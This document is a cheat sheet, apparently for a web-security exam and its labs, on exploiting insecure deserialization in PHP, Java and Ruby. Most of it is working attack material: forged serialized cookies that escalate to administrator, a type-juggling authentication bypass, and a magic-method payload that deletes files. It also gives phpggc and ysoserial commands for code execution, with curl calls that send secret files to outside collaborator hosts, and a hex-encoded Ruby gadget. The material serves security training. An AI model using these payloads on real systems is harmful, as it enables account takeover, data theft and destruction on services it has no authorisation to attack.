## 🎯 Target Location

**Primary Target:** Session cookies (Base64-encoded serialized objects)

**Goal:** Modify serialized cookie to escalate privileges to administrator

## 🔍 Detection

### PHP Serialization Format
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

**Format breakdown:**
- `O:4:"User"` - Object of class "User" (4 characters)
- `2:{}` - 2 properties
- `s:8:"username"` - String property "username" (8 characters)
- `s:6:"carlos"` - String value "carlos" (6 characters)
- `b:0` - Boolean value false

### Java Serialization Format
**Base64-encoded, starts with:** `rO0AB...`

**Binary signature:** `ac ed 00 05` (hex)

# 🔥 PHP Deserialization

### Lab 1: Modifying Object Attributes
**Scenario:** Cookie contains serialized User object with `isAdmin` attribute

**Original Cookie (Base64-decoded):**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:0;}
```

**Modified (Escalate to Admin):**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:7:"isAdmin";b:1;}
```

**Steps:**
1. Intercept request with session cookie
2. Base64-decode the cookie
3. Modify `isAdmin` from `b:0` to `b:1`
4. Update username to `administrator`
5. **IMPORTANT:** Update length indicators:
   - `s:6:"wiener"` → `s:13:"administrator"` (13 characters)
6. Base64-encode modified object
7. Replace cookie and send request

---

### Lab 2: Modifying Data Types (PHP Type Juggling)
**Scenario:** Loose comparison (`==`) used for password check

**Vulnerable Code:**
```php
$login = unserialize($_COOKIE);
if ($login['password'] == $password) {
    // log in successfully
}
```

**Original Cookie:**
```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"abc123..."}
```

**Exploit (Change string to integer 0):**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

**Why it works:**
- PHP's loose comparison: `0 == "any_string"` evaluates to `true`
- Changing `s:32:"abc123..."` (string) to `i:0` (integer)
- **Note:** Only works on PHP 7.x and earlier

**Steps:**
1. Decode cookie
2. Change `access_token` from string (`s:32:"..."`) to integer (`i:0`)
3. Update length indicators
4. Re-encode and send

---

### Lab 3: Using Application Functionality (Magic Methods)
**Scenario:** Application has `__destruct()` magic method that deletes files

**Vulnerable Class:**
```php
class CustomTemplate {
    private $lock_file_path;
    
    function __destruct() {
        unlink($this->lock_file_path);
    }
}
```

**Exploit (Delete arbitrary file):**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

**How it works:**
- `__destruct()` is called automatically when object is destroyed
- We control `lock_file_path` attribute
- File at that path gets deleted

**Steps:**
1. Identify class with dangerous magic method
2. Create serialized object with malicious attribute
3. Base64-encode and set as cookie
4. Trigger deserialization (page load)

### Lab 4: Chained gadget
#### Framework RCE
phpggc
```bash
# Base64 Payload
phpggc Symfony/RCE4 exec 'curl http://3lpq1litlwmg1483mqhhnd3bv21xpndc.oastify.com' | base64 -w 0

# URL Encoded Payload
phpggc Symfony/RCE4 exec 'curl http://3lpq1litlwmg1483mqhhnd3bv21xpndc.oastify.com' > payload.bin
python3 -c "import urllib.parse, sys; print(urllib.parse.quote(open(sys.argv[1], 'rb').read()))" payload.bin
```

Other frameworks:
```
phpggc -l
phpggc -i symfony/rce1
```

## 📚 Common PHP Magic Methods

| Method          | When Invoked             | Use Case                 |
| --------------- | ------------------------ | ------------------------ |
| `__construct()` | Object creation          | Initialize attributes    |
| `__destruct()`  | Object destruction       | Cleanup, file operations |
| `__wakeup()`    | After `unserialize()`    | Re-initialize object     |
| `__toString()`  | Object treated as string | String conversion        |
| `__call()`      | Undefined method called  | Method overloading       |

---
# 🔥 Java Deserialization

Detect using `Deserialization Scanner`. Payload must be encoded usually, keep an eye on the right encoding.

### Prerequisites
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Requires Java JDK 11+
```

### Lab 4: Exploiting Java Deserialization
**Scenario:** Session cookie contains Java serialized object

**Generate Payload (Delete file):**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

**With gzip compression:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | gzip -f | base64 -w 0
```

**Common Gadget Chains:**
- `CommonsCollections1-7` - Apache Commons Collections
- `Spring1-2` - Spring Framework
- `Jdk7u21` - Java JDK
- `Hibernate1-2` - Hibernate ORM

**Steps:**
1. Identify Java serialization (cookie starts with `rO0AB`)
2. Generate payload with ysoserial
3. Replace cookie value with generated payload
4. Send request
### Using ysoserial

#### Detection Payloads (URLDNS)
**Use URLDNS chain for detection (works on any Java version):**

```bash
java -jar ysoserial-all.jar URLDNS "http://burp.oastify.com" | base64 -w 0
```

**How it works:**
- Triggers DNS lookup to your Burp Collaborator
- No specific vulnerable library required
- Universal detection method

**Generate gadget to delete file:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

**With gzip compression:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | gzip -f | base64 -w 0
```

**Read file and exfiltrate:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "curl http://burp.oastify.com/?c=\$(cat /home/carlos/secret | base64)" | base64 -w 0
```

Send file
```sh
java -jar ysoserial-all.jar CommonsBeanutils1 'curl -X POST --data-binary @/home/carlos/secret https://bdsj70n34zym094mi7si68ym1d7av1jq.oastify.com' | gzip -f | base64 -w 0
```


---

## 🎓 Exam Tips

1. **Install Java Deserialization Scanner** - Detects Java serialization
2. **Check cookies for Base64** - Decode to check for serialized objects
3. **Look for PHP format** - `O:4:"User":...` pattern
4. **Look for Java format** - Starts with `rO0AB` when base64-encoded
5. **Try modifying values** - Change admin flag, username, etc, most common privilege escalation
6. **Update length indicators** - Critical for PHP serialization
7. **Use ysoserial for Java** - Don't waste time on manual gadget chains
8. **Try URLDNS first** - Universal Java deserialization detection
9. If access to stack traces, identify code logic and think of potential vulnerabilities. EX. Vulnerabilities in PHP comparison or use of magic methods.
10. **Shell output strips null chars** - If a payload includes null chars, like %00 or \x00, they are ignored in shell output. must be read in hex o base64.

## 🔍 Testing Workflow

### Step 1: Identify Serialized Cookie
```bash
# Decode cookie
echo "TzoyOiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo3OiJpc0FkbWluIjtiOjA7fQ==" | base64 -d
```

### Step 2: Modify Object
```php
# Original
O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:0;}

# Modified
O:4:"User":2:{s:8:"username";s:13:"administrator";s:7:"isAdmin";b:1;}
```

### Step 3: Re-encode
```bash
echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:7:"isAdmin";b:1;}' | base64 -w 0
```
### Step 4: Replace Cookie and Test

# 💎 Ruby Deserialization

## Gadgets

### Ruby 3.1

https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md

```bash
docker run --rm -it -v "$PWD:/lab" ruby:3.0 bash -c "gem install rails sprockets && cd /lab && bash"
ruby Ruby-deserialization-gadget-on-rails.rb
```

### Ruby 2.x - 3.x

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

```bash
docker run --rm -it -v "$PWD:/lab" ruby:3.0 bash
ruby /lab/devcraft-Universal-Deserialisation-Gadget.rb
```

### Ruby 2.x - 3.x

https://gist.github.com/rootxharsh/844e901f79c036245f6e336134255ce2

```bash
docker run --rm -it -v "$PWD:/lab" ruby:3.0 bash
ruby /lab/RUBY-2.x-UNIVERSAL-RCE-DESERIALIZATION-GADGET.rb
```

### Ruby 2.x

https://www.elttam.com/blog/ruby-deserialization

```bash
# WARGNING: Script has wrong quotes on line
# IO.popen('ruby -e 'Marshal.load(STDIN.read) rescue nil'', 'r+') do |pipe|
# -> IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", 'r+') do |pipe|
docker run --rm -it -v "$PWD:/lab" ruby:2.7 bash
ruby /lab/elttam-Ruby-2.x-Universal-RCE.rb
```

## Marshal Deserialization

Script to verify the deserialization gadget chain against Ruby 2.0 through to 2.7

```ruby
for i in {0..7}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

---
# 🔗 Quick Reference

| Language | Format               | Detection             |
| -------- | -------------------- | --------------------- |
| PHP      | `O:4:"User":2:{...}` | Look for `O:` pattern |
| Java     | Binary (base64)      | Starts with `rO0AB`   |
| Python   | `pickle` format      | Binary format         |
| Ruby     | Marshal format       | Binary format         |
